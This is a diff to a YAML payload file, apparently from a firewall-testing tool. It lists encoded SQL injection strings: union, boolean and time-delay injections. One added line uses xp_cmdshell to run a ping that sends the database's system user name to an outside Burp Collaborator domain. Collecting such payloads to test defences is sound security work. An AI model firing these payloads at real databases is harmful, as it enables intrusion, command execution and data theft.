@@ -1,8 +1,11 @@
+---
 payload:
   - '"union select -7431.1, name, @aaa from u_base--w-'
   - "'or 123.22=123.22"
   - "' waitfor delay '00:00:10'--"
   - "')) or pg_sleep(5)--"
+  - "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*/"
+  - "3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3"
 encoder:
   - Base64Flat
   - URL
